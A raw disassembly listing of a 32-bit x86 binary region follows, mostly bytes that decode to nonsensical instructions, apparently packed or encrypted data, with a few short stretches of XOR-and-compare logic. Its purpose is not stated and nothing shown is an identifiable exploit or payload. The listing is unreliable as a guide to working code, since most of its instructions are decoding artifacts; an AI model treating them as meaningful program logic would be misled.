  4150bf:	and    DWORD PTR [esi-0x7e],edx
  4150c2:	dec    esp
  4150c3:	mov    ecx,0x4c8f037a
  4150c8:	imul   esi,DWORD PTR [ecx+esi*8+0x7158bc19],0xa6539bce
  4150d3:	std    
  4150d4:	ins    DWORD PTR es:[edi],dx
  4150d5:	pop    edx
  4150d6:	cdq    
  4150d7:	ret    
  4150d8:	cs fs pop ebp
  4150db:	adc    cl,bh
  4150dd:	cdq    
  4150de:	stos   BYTE PTR es:[edi],al
  4150df:	ds aam 0xfb
  4150e2:	das    
  4150e3:	adc    BYTE PTR [ebx-0x7fb75492],bh
  4150e9:	rcl    BYTE PTR [ebp-0x17],cl
  4150ec:	outs   dx,DWORD PTR ds:[esi]
  4150ed:	dec    ebx
  4150ee:	cmc    
  4150ef:	pop    ebp
  4150f0:	fs jmp 0x3cc1:0x563c1a77
  4150f8:	shr    DWORD PTR [ecx-0x59],1
  4150fb:	loopne 0x41511a
  4150fd:	mov    dh,0x7e
  4150ff:	fcom   DWORD PTR [eax-0x46e0ef10]
  415105:	sbb    eax,0x2b3ad4c1
  41510a:	icebp  
  41510b:	pop    ebp
  41510c:	mov    ds:0x112821eb,eax
  415111:	and    eax,0xd968f499
  415116:	add    eax,0x1c4197a
  41511b:	in     eax,0xbe
  41511d:	out    dx,eax
  41511e:	sbb    BYTE PTR [eax+0x5e7d3620],ah
  415124:	xchg   ebx,eax
  415125:	pop    esi
  415126:	xchg   edi,eax
  415127:	xchg   esp,eax
  415128:	pop    esi
  415129:	pop    esp
  41512a:	xor    DWORD PTR [ebx+0x3b0d0cb],ebp
  415130:	mov    ds:0x51592582,al
  415135:	xchg   esi,eax
  415136:	mov    ss,WORD PTR [ebp+esi*2-0xe]
  41513a:	jae    0x415173
  41513c:	pop    ebp
  41513d:	sub    dh,BYTE PTR [ebp-0x50818fb2]
  415143:	dec    edi
  415144:	and    edx,edi
  415146:	test   eax,0xd5169e5b
  41514b:	imul   ecx,DWORD PTR [ecx+0x5ca94786],0x8b66c457
  415155:	sbb    eax,0xa73eb22e
  41515a:	xor    BYTE PTR [ebx],ch
  41515c:	or     ch,BYTE PTR [edi]
  41515e:	cmp    DWORD PTR [ebx+0x1026b965],eax
  415164:	pop    ds
  415165:	add    al,BYTE PTR [ebx]
  415167:	pop    esi
  415168:	dec    eax
  415169:	xchg   esi,eax
  41516a:	lods   eax,DWORD PTR ds:[esi]
  41516b:	cmc    
  41516c:	into   
  41516d:	push   ds
  41516e:	pop    ss
  41516f:	or     ebp,DWORD PTR [edi-0x20]
  415172:	imul   esp,DWORD PTR [ebx-0x123f9708],0xffffffd5
  415179:	mov    ebx,0xdda5db09
  41517e:	(bad)  [ebx]
  415180:	loopne 0x41510b
  415182:	fmul   QWORD PTR gs:[ebx+0x55b9fc45]
  415189:	or     BYTE PTR [ecx+0x7],dl
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fnstenv [ebp+0x51]
  4151a6:	data16 mov bh,0xed
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	or     DWORD PTR ds:0x67957ab7,ecx
  4151b6:	mov    ecx,0xc79b5c74
  4151bb:	int    0xe1
  4151bd:	xchg   edi,eax
  4151be:	add    al,0xc7
  4151c0:	adc    ah,BYTE PTR [edx+edi*1]
  4151c3:	sbb    edi,0xab0443b5
  4151c9:	fst    QWORD PTR [edx+0x29e8be9a]
  4151cf:	push   eax
  4151d0:	outs   dx,BYTE PTR ds:[esi]
  4151d1:	dec    edi
  4151d2:	(bad)  
  4151d3:	div    ch
  4151d5:	add    al,0xd3
  4151d7:	sbb    al,0x50
  4151d9:	cmp    al,0x44
  4151db:	lods   eax,DWORD PTR ds:[esi]
  4151dc:	sub    DWORD PTR [ebx-0x54fd5b07],ebp
  4151e2:	(bad)  
  4151e3:	sbb    bl,cl
  4151e5:	xchg   dh,cl
  4151e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151e8:	mov    eax,0x618ed880
  4151ed:	stc    
  4151ee:	jmp    0x4151d2
  4151f0:	loopne 0x4151ba
  4151f2:	cmp    al,0xdc
  4151f4:	mov    DWORD PTR [ecx+0x69],ecx
  4151f7:	mov    dh,0x62
  4151f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151fa:	dec    esp
  4151fb:	push   esp
  4151fc:	mov    DWORD PTR [ebp-0x2a3ae98],esi
  415202:	and    BYTE PTR [esi+0x2fdcc3bc],dl
  415208:	in     al,dx
  415209:	add    dh,BYTE PTR [ecx+esi*4-0x242fddb9]
  415210:	jmp    0x415235
  415212:	das    
  415213:	retf   0xd05e
  415216:	out    0x1b,eax
  415218:	fiadd  WORD PTR [edi]
  41521a:	and    al,BYTE PTR [ecx+0x10]
  41521d:	mov    edx,DWORD PTR [esi+0x32]
  415220:	xor    esp,DWORD PTR [edi]
  415222:	in     eax,0x19
  415224:	out    0x4b,al
  415226:	mov    ds:0xf998de60,eax
  41522b:	dec    esp
  41522c:	mov    dh,0x4e
  41522e:	jge    0x415277
  415230:	rol    dl,cl
  415232:	loope  0x4151de
  415234:	mov    ebx,0x4910f3ee
  415239:	sbb    ecx,edx
  41523b:	bound  esp,QWORD PTR [edi+0x14ed57ae]
  415241:	test   DWORD PTR [edi-0x232ede92],esp
  415247:	dec    edx
  415248:	inc    esp
  415249:	pop    edx
  41524a:	out    0xeb,al
  41524c:	popa   
  41524d:	push   0x6a22c97
  415252:	enter  0x8b01,0x7f
  415256:	out    dx,al
  415257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415258:	cmp    al,0x57
  41525a:	in     al,dx
  41525b:	sub    BYTE PTR [ecx+ecx*8+0x51],ch
  41525f:	dec    esi
  415260:	fcmovbe st,st(5)
  415262:	je     0x415240
  415264:	pop    esi
  415265:	jecxz  0x415287
  415267:	iret   
  415268:	lahf   
  415269:	int    0xf3
  41526b:	es cwde 
  41526d:	sub    DWORD PTR [edx+0x221e350f],esp
  415273:	cli    
  415274:	rcr    al,cl
  415276:	xor    DWORD PTR [ebx+0x62f1fea1],0x39
  41527d:	loop   0x41524b
  41527f:	mov    dl,dl
  415281:	iret   
  415282:	pushf  
  415283:	(bad)  
  415284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415285:	inc    edx
  415286:	dec    edi
  415287:	push   ds
  415288:	cmp    eax,0xc4a19c9d
  41528d:	push   cs
  41528e:	xchg   BYTE PTR [esi],bh
  415290:	jge    0x415222
  415292:	jecxz  0x41522e
  415294:	scas   eax,DWORD PTR es:[edi]
  415295:	and    DWORD PTR [edi+ebx*1],ebp
  415298:	sahf   
  415299:	inc    ebp
  41529a:	mov    bh,0x6d
  41529c:	sbb    eax,0x81c60e4c
  4152a1:	mov    ebx,ds
  4152a3:	sahf   
  4152a4:	in     al,0xd2
  4152a6:	outs   dx,DWORD PTR ds:[esi]
  4152a7:	xor    al,0x46
  4152a9:	sti    
  4152aa:	add    DWORD PTR [ebx-0x46bbe57e],eax
  4152b0:	adc    bh,dl
  4152b2:	ds cld 
  4152b4:	(bad)  
  4152b6:	mov    ebp,0xe5239eeb
  4152bb:	lods   eax,DWORD PTR ds:[esi]
  4152bc:	loop   0x4152e6
  4152be:	(bad)  
  4152bf:	mov    dl,0xe4
  4152c1:	sub    eax,0x877bdba3
  4152c6:	and    DWORD PTR [eax+0x17],0x56
  4152ca:	(bad)  
  4152cb:	xlat   BYTE PTR ds:[ebx]
  4152cc:	xor    al,0x62
  4152ce:	xchg   ebp,eax
  4152cf:	in     al,dx
  4152d0:	ret    
  4152d1:	adc    al,0xd6
  4152d3:	out    dx,eax
  4152d4:	mov    esi,0xb77e32a5
  4152d9:	cdq    
  4152da:	lahf   
  4152db:	fs pop esp
  4152dd:	rcr    DWORD PTR [ebx],1
  4152df:	loope  0x415347
  4152e1:	test   esp,ebp
  4152e3:	mov    al,ds:0x4ea93c6
  4152e8:	jae    0x415354
  4152ea:	dec    eax
  4152eb:	jmp    0x157a:0x8ae34abb
  4152f2:	scas   eax,DWORD PTR es:[edi]
  4152f3:	jbe    0x415358
  4152f5:	adc    al,0x4
  4152f7:	mov    esp,0x9bab97f3
  4152fc:	inc    ebx
  4152fd:	jno    0x41530c
  4152ff:	addr16 cli 
  415301:	sub    al,0xa7
  415303:	jnp    0x4152c5
  415305:	mov    al,gs:0x89489a62
  41530b:	les    ebp,FWORD PTR [ebx+esi*1]
  41530e:	js     0x415302
  415310:	sub    dh,BYTE PTR [edi+esi*1]
  415313:	and    esi,esi
  415315:	jmp    FWORD PTR [esi]
  415317:	inc    ebp
  415318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415319:	mov    dl,0x26
  41531b:	or     ebp,edx
  41531d:	sbb    al,0x67
  41531f:	jecxz  0x4152ac
  415321:	dec    edi
  415322:	sti    
  415323:	mov    bl,0x3e
  415325:	scas   al,BYTE PTR es:[edi]
  415326:	and    DWORD PTR [ecx+0x14],eax
  415329:	push   cs
  41532a:	and    esi,0x51877d94
  415330:	mov    dh,0x3b
  415332:	mov    esi,0x2333e74f
  415337:	test   eax,0xd0eb0d2f
  41533c:	add    al,BYTE PTR [ecx]
  41533e:	cmp    al,0xed
  415340:	repz dec edi
  415342:	xor    BYTE PTR [edx*2+0x47aa16bf],ch
  415349:	cs mov ah,0xd
  41534c:	cmp    BYTE PTR [ebp+0x7a9febf1],dh
  415352:	xchg   esp,eax
  415353:	ins    BYTE PTR es:[edi],dx
  415354:	push   eax
  415355:	nop
  415356:	(bad)  
  415357:	in     eax,0x44
  415359:	xchg   DWORD PTR [edx],ebx
  41535b:	cmp    BYTE PTR [ebx+0x2],ah
  41535e:	ins    DWORD PTR es:[edi],dx
  41535f:	(bad)  
  415360:	sub    eax,0xc79b00b5
  415365:	xor    dl,BYTE PTR [ebp+esi*4-0x4f2a5fe3]
  41536c:	rcr    BYTE PTR [eax+0x70e1b51d],cl
  415372:	hlt    
  415373:	push   ecx
  415374:	sbb    al,0x63
  415376:	pop    ecx
  415377:	ins    DWORD PTR es:[edi],dx
  415378:	pop    ebx
  415379:	cs jmp 0x21af:0x85bdc84a
  415381:	int    0x75
  415383:	push   ecx
  415384:	cli    
  415385:	mov    edi,0x14440a9f
  41538a:	test   eax,0x64b93629
  41538f:	repz mov ch,0x37
  415392:	xor    ebx,ebx
  415394:	sti    
  415395:	xor    esp,ecx
  415397:	sub    ebp,DWORD PTR [edi+0x76cf0945]
  41539d:	test   ax,0x1423
  4153a1:	cmp    bl,dl
  4153a3:	mov    dh,0x48
  4153a5:	neg    DWORD PTR [edx-0x1d]
  4153a8:	shl    ecx,cl
  4153aa:	jmp    FWORD PTR [edx-0xef57090]
  4153b0:	ss jae 0x415338
  4153b3:	jbe    0x41542c
  4153b5:	xchg   ebp,eax
  4153b6:	xor    al,0x27
  4153b8:	outs   dx,DWORD PTR ds:[esi]
  4153b9:	or     al,0xa4
  4153bb:	jae    0x4153b8
  4153bd:	push   cs
  4153be:	lods   eax,DWORD PTR ds:[esi]
  4153bf:	call   0xe5e2:0x6179ee79
  4153c6:	mov    ds:0x16b9b8ab,eax
  4153cb:	out    dx,al
  4153cc:	xor    ecx,DWORD PTR ds:0x714a78e4
  4153d2:	rcl    BYTE PTR [ebx+0x5c],cl
  4153d5:	(bad)  
  4153d6:	cs std 
  4153d8:	xchg   esi,eax
  4153d9:	std    
  4153da:	xor    BYTE PTR es:[ecx-0x6b28fe10],dh
  4153e1:	cmp    eax,0x5b6ccb96
  4153e6:	mov    dl,0x99
  4153e8:	sbb    ebp,DWORD PTR [eax-0x77]
  4153eb:	mov    esp,0x42252760
  4153f0:	mov    cl,0x8
  4153f2:	pop    esi
  4153f3:	das    
  4153f4:	mov    esi,0x867ee015
  4153f9:	mov    ebp,0xe40001d1
  4153fe:	push   0xdd030d14
  415403:	pop    esp
  415404:	les    ebx,FWORD PTR [eax]
  415406:	jecxz  0x41547b
  415408:	push   esi
  415409:	inc    ebp
  41540a:	ds popf 
  41540c:	adc    DWORD PTR [ecx+0x36],edx
  41540f:	inc    edi
  415410:	inc    ecx
  415411:	dec    esi
  415412:	jnp    0x4153e9
  415414:	cs jp  0x4153db
  415417:	ficomp WORD PTR [esi]
  415419:	pop    edx
  41541a:	cmc    
  41541b:	jmp    0xfda2:0x54400bc0
  415422:	icebp  
  415423:	out    0xf0,eax
  415425:	jmp    0xb661a1c2
  41542a:	addr16 gs pop edi
  41542d:	ja     0x4153e3
  41542f:	mov    ds:0xe9943c0,eax
  415434:	xor    al,0xdb
  415436:	imul   ebp,DWORD PTR [edx+0x45],0x5c
  41543a:	inc    DWORD PTR [ebx-0x57f5de9f]
  415440:	push   0xffffffb0
  415442:	jb     0x41548f
  415444:	mov    esi,0x5a0ff1b8
  415449:	retf   0x3929
  41544c:	int    0xe3
  41544e:	fild   QWORD PTR [ebx-0x417e740f]
  415454:	and    eax,0x831d1234
  415459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41545a:	call   0x4f8d:0xcb48047d
  415461:	dec    esp
  415462:	pop    ebp
  415463:	sub    BYTE PTR [ebx-0x78a3a669],0xa9
  41546a:	dec    edi
  41546b:	out    dx,eax
  41546c:	iret   
  41546d:	call   0x1c2a8688
  415472:	imul   eax,DWORD PTR [ebx+0x329ab97],0xffffffc2
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x7e
  4154c8:	xchg   ebx,eax
  4154c9:	scas   eax,DWORD PTR es:[edi]
  4154ca:	inc    eax
  4154cb:	add    bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0xcf70707e
  4154d4:	dec    ebp
  4154d5:	xchg   BYTE PTR [ebp-0x41],al
  4154d8:	sbb    al,0x8a
  4154da:	call   0xe22c:0x756616e4
  4154e1:	pop    esi
  4154e2:	pop    edx
  4154e3:	stc    
  4154e4:	fistp  WORD PTR [edi]
  4154e6:	mov    dl,0xc6
  4154e8:	xor    esi,DWORD PTR [edx+0x48d43932]
  4154ee:	fcomp  QWORD PTR [ecx+0x66]
  4154f1:	and    al,0xb1
  4154f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154f4:	outs   dx,BYTE PTR ds:[esi]
  4154f5:	leave  
  4154f6:	(bad)  
  4154f7:	push   ebp
  4154f8:	adc    al,0xbf
  4154fa:	adc    DWORD PTR [esi+0x2],edx
  4154fd:	aaa    
  4154fe:	test   BYTE PTR [edx],bl
  415500:	out    0x2a,eax
  415502:	sub    al,0xcd
  415504:	or     al,0x2e
  415506:	dec    esp
  415507:	nop
  415508:	push   0x9679eabc
  41550d:	es retf 
  41550f:	fdiv   QWORD PTR ds:0x5bd817fc
  415515:	mov    ebx,cs
  415517:	nop
  415518:	mov    ecx,0x385d31d5
  41551d:	loopne 0x4154f5
  41551f:	mov    esi,0x944c196c
  415524:	mov    cl,0x6e
  415526:	xlat   BYTE PTR ds:[ebx]
  415527:	ins    BYTE PTR es:[edi],dx
  415528:	int3   
  415529:	xor    BYTE PTR [ebx-0x7],0x60
  41552d:	mov    ah,0x56
  41552f:	imul   esp,DWORD PTR [edi-0x3444bef9],0xfffffff1
  415536:	rcl    BYTE PTR [esi],1
  415538:	into   
  415539:	or     DWORD PTR [eax-0x2fe7b6e9],esi
  41553f:	and    al,0x72
  415541:	retf   
  415542:	pushf  
  415543:	mov    bl,0x66
  415545:	pushf  
  415546:	cmc    
  415547:	xor    DWORD PTR [edi],ebx
  415549:	and    al,BYTE PTR [ebx+eiz*8+0x6a]
  41554d:	jge    0x4155a9
  41554f:	add    ah,BYTE PTR [ebx+0x65]
  415552:	mov    ebx,0x46c3e2e0
  415557:	aaa    
  415558:	mul    DWORD PTR [edx]
  41555a:	and    eax,0xa3728d0f
  41555f:	xor    ah,BYTE PTR [ebp+0xb]
  415562:	aas    
  415563:	retf   
  415564:	xor    DWORD PTR ss:[ecx],0x46
  415568:	test   al,0xc4
  41556a:	xchg   DWORD PTR [ecx+0x6d],edx
  41556d:	mov    ecx,0xc12546bd
  415572:	xchg   edx,eax
  415573:	fdivr  DWORD PTR [ebx-0x1b]
  415576:	clc    
  415577:	pop    edx
  415578:	adc    al,0x1e
  41557a:	cwde   
  41557b:	adc    bh,cl
  41557d:	dec    ebx
  41557e:	retf   
  41557f:	rol    DWORD PTR [ebx],cl
  415581:	inc    edi
  415582:	call   0x43e4:0x204ed6f8
  415589:	fs xchg edx,eax
  41558b:	sub    eax,0x45157a66
  415590:	les    edx,FWORD PTR [esi]
  415592:	pushf  
  415593:	pushf  
  415594:	pop    ds
  415595:	adc    DWORD PTR [ebx+0x5c],0x44d7ce72
  41559c:	cdq    
  41559d:	imul   edi,DWORD PTR [esi+0xcade24c],0x473904c7
  4155a7:	int    0x92
  4155a9:	fwait
  4155aa:	or     al,BYTE PTR [esp+edi*1]
  4155ad:	dec    edi
  4155ae:	(bad)  
  4155af:	sub    al,0x61
  4155b1:	dec    ebx
  4155b2:	mov    esp,0x65f46282
  4155b7:	mov    edi,ebp
  4155b9:	fsubr  QWORD PTR [ebp-0x5e]
  4155bc:	or     esi,DWORD PTR [ecx]
  4155be:	outs   dx,BYTE PTR ds:[esi]
  4155bf:	mov    dl,0xbd
  4155c1:	xchg   DWORD PTR [edx+0x6070a3d1],edx
  4155c7:	ret    
  4155c8:	ins    DWORD PTR es:[edi],dx
  4155c9:	popa   
  4155ca:	push   ebx
  4155cb:	icebp  
  4155cc:	out    0xfc,eax
  4155ce:	jns    0x4155a4
  4155d0:	and    eax,0xb64c294
  4155d5:	in     eax,dx
  4155d6:	sbb    eax,0xec95da07
  4155db:	xchg   DWORD PTR [ecx-0x10dfe22f],ecx
  4155e1:	addr16 jp 0x41565e
  4155e4:	pop    ecx
  4155e5:	imul   edi,DWORD PTR [edi],0x23fd0e8f
  4155eb:	scas   al,BYTE PTR es:[edi]
  4155ec:	xchg   ebp,eax
  4155ed:	xchg   esi,eax
  4155ee:	sbb    edi,ebp
  4155f0:	psubusb mm2,QWORD PTR [eax+esi*4]
  4155f4:	pop    ebp
  4155f5:	mov    esp,0xbdca825c
  4155fa:	cmp    DWORD PTR [ebp-0x62c80b86],esp
  415600:	hlt    
  415601:	hlt    
  415602:	sbb    eax,0x7b476c60
  415607:	adc    ebx,DWORD PTR [edi+0x2]
  41560a:	push   edi
  41560b:	(bad)  
  41560c:	rcl    DWORD PTR [ecx-0x50],cl
  41560f:	mov    esi,0x286f6456
  415614:	mov    esi,0x6f52db7f
  415619:	sub    edx,DWORD PTR [ebx-0x72]
  41561c:	fist   WORD PTR [ebp+0x70]
  41561f:	cmp    al,BYTE PTR [esi]
  415621:	clc    
  415622:	test   ebx,edi
  415624:	add    eax,0xa96fd6ee
  415629:	adc    al,0xcd
  41562b:	sbb    esp,0x9b2c8763
  415631:	sub    ebx,DWORD PTR [eax]
  415633:	jne    0x4156a8
  415635:	outs   dx,DWORD PTR ds:[esi]
  415636:	rol    BYTE PTR [ecx+0x79],cl
  415639:	stc    
  41563a:	aad    0x74
  41563c:	sub    bh,BYTE PTR [esi+0x664b6c79]
  415642:	fnsave [esi+eax*4]
  415645:	imul   ecx,DWORD PTR [ecx+eiz*4-0x58e1ee65],0x67
  41564d:	cmp    dl,0x8a
  415650:	scas   eax,DWORD PTR es:[edi]
  415651:	xchg   esp,eax
  415652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415653:	push   esi
  415654:	je     0x4156b4
  415656:	out    dx,eax
  415657:	js     0x4155f2
  415659:	inc    ebx
  41565a:	push   ss
  41565b:	dec    edi
  41565c:	cmp    DWORD PTR [esi+0x65],esi
  41565f:	dec    ebx
  415660:	mov    cl,0x70
  415662:	push   0xffffffaf
  415664:	int3   
  415665:	jp     0x4156b6
  415667:	outs   dx,BYTE PTR ds:[esi]
  415668:	push   eax
  415669:	dec    edi
  41566a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41566b:	scas   eax,DWORD PTR es:[edi]
  41566c:	jae    0x415624
  41566e:	ins    DWORD PTR es:[edi],dx
  41566f:	jne    0x4156d9
  415671:	and    esp,DWORD PTR ds:0xe906c4cc
  415677:	jb     0x415632
  415679:	push   esi
  41567a:	xor    BYTE PTR [esi],dl
  41567c:	cmp    al,0x15
  41567e:	pop    ebp
  41567f:	das    
  415680:	stos   BYTE PTR es:[edi],al
  415681:	inc    ecx
  415682:	cmp    al,0x8
  415684:	xlat   BYTE PTR ds:[ebx]
  415685:	mov    al,ds:0x44a46e5d
  41568a:	or     esp,DWORD PTR [esi]
  41568c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41568d:	xchg   esp,eax
  41568e:	(bad)  
  415690:	push   esp
  415691:	inc    edi
  415692:	dec    ecx
  415693:	pusha  
  415694:	(bad)  
  415695:	jecxz  0x4156c2
  415697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415698:	pop    es
  415699:	lds    ebp,FWORD PTR [eiz*1+0x18f40e03]
  4156a0:	push   0x10
  4156a2:	ret    0x5920
  4156a5:	adc    DWORD PTR [ebx+0x7c],edx
  4156a8:	push   es
  4156a9:	lahf   
  4156aa:	scas   eax,DWORD PTR es:[edi]
  4156ab:	mov    eax,ds:0x6eb5b0e4
  4156b0:	inc    ebp
  4156b1:	xchg   esp,eax
  4156b2:	push   0xd525b3cb
  4156b7:	add    ebx,edi
  4156b9:	js     0x415640
  4156bb:	sbb    DWORD PTR [eax],ebp
  4156bd:	rol    ch,0x42
  4156c0:	ins    DWORD PTR es:[edi],dx
  4156c1:	xor    al,0xe1
  4156c3:	mov    dh,0xe5
  4156c5:	jg     0x4156f8
  4156c7:	and    DWORD PTR [eax],ebx
  4156c9:	add    eax,0x7f5dd2d2
  4156ce:	sub    bl,0x54
  4156d1:	cmp    eax,0xca6962ad
  4156d6:	lea    eax,[ecx+edx*2+0x166a8c50]
  4156dd:	mov    ecx,0x50b65bbc
  4156e2:	mov    BYTE PTR [eax-0x31],bl
  4156e5:	mov    ebx,0xd39a8b58
  4156ea:	xor    eax,0xbc832def
  4156ef:	and    BYTE PTR [ebx+0x27a5f9e1],ah
  4156f5:	adc    cl,BYTE PTR [esi+0x93ad7ed]
  4156fb:	jge    0x415721
  4156fd:	stos   DWORD PTR es:[edi],eax
  4156fe:	stos   BYTE PTR es:[edi],al
  4156ff:	pusha  
  415700:	shl    BYTE PTR [eax-0x63],1
  415703:	cmp    DWORD PTR [ecx],ebx
  415705:	push   0xfffffff2
  415707:	bswap  esp
  415709:	div    BYTE PTR [ecx-0x74c3b959]
  41570f:	mov    ds:0x21ef39af,eax
  415714:	sbb    al,0x4
  415716:	loopne 0x41569e
  415718:	repz mov ch,0xdb
  41571b:	pop    edi
  41571c:	ret    
  41571d:	je     0x415768
  41571f:	daa    
  415720:	pushf  
  415721:	jne    0x415752
  415723:	sub    DWORD PTR [edi+0x5a],0xa0f47c1b
  41572a:	sbb    ebp,esi
  41572c:	nop
  41572d:	add    eax,0xad2509a7
  415732:	or     esi,DWORD PTR [eax+0x41]
  415735:	ins    BYTE PTR es:[edi],dx
  415736:	fwait
  415737:	(bad)
  41573b:	ret    
  41573c:	out    dx,al
  41573d:	sbb    al,0x65
  41573f:	mov    dh,0xc3
  415741:	lods   eax,DWORD PTR ds:[esi]
  415742:	push   ecx
  415743:	xchg   esp,eax
  415744:	not    BYTE PTR [ebp+0x19cd6b43]
  41574a:	outs   dx,BYTE PTR ds:[esi]
  41574b:	pop    edi
  41574c:	add    eax,0x4179c7a7
  415751:	add    BYTE PTR [edi-0x4],al
  415754:	xchg   edi,eax
  415755:	sar    DWORD PTR [esi+0x3e],cl
  415758:	out    0x72,eax
  41575a:	daa    
  41575b:	cli    
  41575c:	or     bl,BYTE PTR [ebp-0x4728b5f4]
  415762:	dec    DWORD PTR [ebp-0x4f]
  415765:	mov    dl,0x7c
  415767:	test   BYTE PTR [esi-0x13b23577],dh
  41576d:	sbb    esp,DWORD PTR [esi+0x71a5f76c]
  415773:	and    DWORD PTR [esi+0x6327e95f],0x255d9c00
  41577d:	add    ebx,DWORD PTR [ecx]
  41577f:	sbb    BYTE PTR [ebx-0x54d19433],bl
  415785:	cld    
  415786:	lea    ebx,[ecx]
  415788:	icebp  
  415789:	inc    edi
  41578a:	in     al,0x0
  41578c:	aam    0x2a
  41578e:	push   0x87db5975
  415793:	fcom   QWORD PTR [edx-0x6583b7c3]
  415799:	sub    DWORD PTR [esi+0x32729c],edi
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR ds:0x7fa1f2cf,al
  4157bc:	movq   QWORD PTR [eax-0x47],mm6
  4157c0:	jle    0x415832
  4157c2:	jo     0x41577d
  4157c4:	dec    ebp
  4157c5:	jne    0x4157e7
  4157c7:	push   esi
  4157c8:	outs   dx,DWORD PTR ds:[esi]
  4157c9:	pop    es
  4157ca:	or     DWORD PTR [edx],eax
  4157cc:	popa   
  4157cd:	cmp    al,0xf
  4157cf:	and    al,0xa0
  4157d1:	ins    DWORD PTR es:[edi],dx
  4157d2:	xchg   ebx,eax
  4157d3:	xor    DWORD PTR [eax],esp
  4157d5:	stos   BYTE PTR es:[edi],al
  4157d6:	sub    ch,bl
  4157d8:	jp     0x4157dd
  4157da:	and    eax,0x85539292
  4157df:	jbe    0x415819
  4157e1:	fstp   DWORD PTR [esi-0x6564d8c2]
  4157e7:	shl    DWORD PTR [eax+0x0],0x1c
  4157eb:	repnz mov ah,0xcf
  4157ee:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4157f0:	inc    esp
  4157f1:	xchg   ebp,eax
  4157f2:	sub    al,0xd0
  4157f4:	test   eax,0x6b2353d
  4157f9:	xchg   ch,cl
  4157fb:	pop    edi
  4157fc:	xchg   ebp,eax
  4157fd:	dec    edi
  4157fe:	lock out dx,al
  415800:	ins    DWORD PTR es:[edi],dx
  415801:	inc    ebp
  415802:	cmp    esi,DWORD PTR [ebp-0xd]
  415805:	mul    BYTE PTR [ecx]
  415807:	fs pop ecx
  415809:	(bad)  
  41580a:	cmc    
  41580b:	or     bh,ch
  41580d:	fsubr  DWORD PTR [ebp-0x28fbc174]
  415813:	sub    eax,0x7c48578
  415818:	int3   
  415819:	push   0x48
  41581b:	je     0x4157cd
  41581d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41581e:	ins    BYTE PTR es:[edi],dx
  41581f:	les    ecx,FWORD PTR [ecx-0x2656f6b9]
  415825:	(bad)  
  415826:	dec    edi
  415827:	loope  0x4157aa
  415829:	lods   eax,DWORD PTR ds:[esi]
  41582a:	dec    ecx
  41582b:	inc    ebp
  41582c:	jmp    0x415884
  41582e:	adc    DWORD PTR [esi+eiz*2-0x2c4ce0b7],edi
  415835:	jb     0x415850
  415837:	inc    ebp
  415838:	dec    ebx
  415839:	inc    edi
  41583a:	sbb    DWORD PTR [ecx],0x3a28d293
  415840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415841:	repz dec edx
  415843:	mov    eax,ds:0x43477da9
  415848:	rol    DWORD PTR [edi+eiz*2-0xd],0x5b
  41584d:	mov    eax,ds:0x9f059d80
  415852:	cmp    al,0x76
  415854:	push   0xb56e1098
  415859:	test   eax,0xc8cbaf1e
  41585e:	jb     0x4157e4
  415860:	sahf   
  415861:	outs   dx,BYTE PTR ds:[esi]
  415862:	(bad)  
  415864:	and    edx,DWORD PTR [esi-0x40]
  415867:	and    bl,BYTE PTR [ebx+ecx*1-0x3a]
  41586b:	xor    al,0x1c
  41586d:	mov    ah,0xb8
  41586f:	and    BYTE PTR [ebp+0x34],bl
  415872:	adc    eax,0x495b5e55
  415877:	xor    BYTE PTR [ebx+0x6c],bl
  41587a:	fwait
  41587b:	dec    ebp
  41587c:	repnz lds esp,FWORD PTR [esi+0x68]
  415880:	inc    ebx
  415881:	fsub   QWORD PTR [ecx+0x328b1241]
  415887:	jge    0x415863
  415889:	cmc    
  41588a:	sub    eax,DWORD PTR [ebx]
  41588c:	fstp   TBYTE PTR [ebp+0xdc21fe7]
  415892:	xchg   ecx,eax
  415893:	inc    ebx
  415894:	adc    al,0x4b
  415896:	jnp    0x41583a
  415898:	retf   
